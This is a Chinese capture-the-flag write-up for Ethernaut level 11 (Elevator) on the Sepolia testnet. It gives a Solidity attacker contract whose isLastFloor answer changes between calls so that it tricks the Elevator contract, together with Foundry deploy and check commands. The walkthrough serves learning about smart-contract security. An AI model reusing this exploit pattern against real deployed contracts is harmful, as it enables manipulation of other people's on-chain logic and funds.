# Level 11

[The Ethernaut level 11](https://ethernaut.openzeppelin.com/level/11)

这一关的要求是让电梯合约达到顶楼。

仔细阅读这个合约，发现 Building 合约并没有任何实现细节。而且 Elevator 合约里实例化 Building 时使用了 msg.send 作为地址。

因此，我们可以编写一个实现了 Building 接口的合约实现关键的 `isLastFloor` 方法。再通过这个合约去调用 `Elevator` 合约的 `goTo` 方法。这样就可以通过控制 `Building` 合约的返回值，进而达到目的。

攻击合约步骤如下：
1. 编写一个实现了 Building 接口的合约
2. 实现 `isLastFloor` 方法，第一次调用时返回 `false，之后调用返回` `true`
3. 编写 `attack` 函数调用 Elevator 的 `goTo(floor)` 方法;
4. 调用 `attack` 函数发起攻击

示例代码如下：

```
contract Attacker is Building {
    Elevator elevator;
    bool hasCalled;

    constructor(address elevator_) {
        elevator = Elevator(elevator_);
    }

    function isLastFloor(uint256 _floor) public returns (bool) {
        if (hasCalled) return true;

        hasCalled = true;
        return false;
    }

    function attack(uint floor) public {
        elevator.goTo(floor);
    }
}
```

还需要一个脚本去部署 `Attacker` 合约并发起攻击

```
address levelAddr = 0x5B0424701F6f9a8e27CF76DAfC918A5E558f0Dc5;

Attacker attacker = new Attacker(levelAddr);

attacker.attack(100);
```

完整代码见：[这里](../../ethernaut/script/level11.s.sol)

Foundry 脚本：

调用脚本部署并发动攻击：
```
forge script script/level11.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

查询是否到达顶层
```
cast call 0x5B0424701F6f9a8e27CF76DAfC918A5E558f0Dc5 \
"top()(bool)" \
--rpc-url sepolia
```


链上记录：
- [level(`Elevator`)](https://sepolia.etherscan.io/address/0x5B0424701F6f9a8e27CF76DAfC918A5E558f0Dc5)
- [Attacker](https://sepolia.etherscan.io/tx/0xe7A0a41d009bB4D3cCEa09A39423e9499A6dEC48)
- [attack 交易](https://sepolia.etherscan.io/tx/0x4fd6a5b48ad937e8e9d210f9cef031d39ba50ea6df51685edbe15e37512b0971)